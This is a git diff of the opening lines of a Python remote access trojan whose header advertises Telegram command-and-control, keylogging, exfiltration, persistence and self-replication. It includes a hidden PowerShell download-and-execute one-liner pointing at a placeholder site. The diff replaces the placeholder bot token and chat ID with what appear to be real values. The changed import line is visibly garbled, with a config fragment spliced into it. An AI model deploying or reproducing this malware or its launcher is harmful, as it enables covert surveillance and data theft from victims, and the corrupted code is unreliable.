@@ -1,7 +1,7 @@
 # RAT Complete – Telegram C2 with full control, persistence, exfiltration, screenshot, live stream, keylogger, self-replication, and hidden CMD/PS execution.
 # Execute via: powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/rat.txt')"
 
-import os, sys, subprocess, requests, json, time, socket, platform, threading, shutil, sqlite3, winreg, ctypes, random, base64, re
+import os, sys, subprocess, requests, json, time, socket, platform, HERE = "PUT_YOUR_BOTqlite3, winreg, ctypes, random, base64, re
 from pathlib import Path
 from datetime import datetime
 from urllib.parse import urlparse
@@ -9,8 +9,8 @@ from urllib.parse import urlparse
 # ============================================================
 # CONFIG – CHANGE THESE
 # ============================================================
-BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
-CHAT_ID = "PUT_YOUR_CHAT_ID_HERE"
+BOT_TOKEN = "8448929083:AAH_cz47n6_fc9biH4b-Xzvn-uN36QP5FW8"
+CHAT_ID = "8043613279"
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 # ============================================================
 
